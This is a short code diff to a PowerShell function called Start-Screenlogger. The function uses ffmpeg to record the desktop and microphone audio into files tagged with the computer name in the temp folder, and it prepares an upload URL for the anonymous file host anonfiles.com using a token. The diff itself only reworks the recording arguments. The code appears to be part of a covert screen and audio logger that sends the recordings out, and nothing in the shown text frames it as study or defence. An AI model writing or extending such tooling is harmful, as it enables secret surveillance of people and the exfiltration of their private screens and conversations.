@@ -56,16 +56,18 @@ function Start-Screenlogger{
     
     while($count -ne $TimesRun){
         $time = Get-Date -Format "ddMMyyyyHHmm";
-        $path = "$env:temp\screenlog-$env:computername-$time.mp4";
+        $path = "$env:temp\screenlog-$env:computername-$time.mkv";
         $url="https://api.anonfiles.com/upload?token=$Anontoken";
         $ffmpegArgs = @(
             "-f gdigrab",
             "-s 1280x720",
             "-r 30",
-            "-vcodec h264",
-            "-t $RecordTime",
             "-rtbufsize 1024M",
-            "-i video=`"desktop`":audio=`"$mic`"", 
+            "-thread_queue_size 1024",
+            "-i `"desktop`"", 
+            "-f dshow",
+            "-i audio=`"$mic`""
+            "-t $RecordTime",
             "-y",
             "$path"
         );
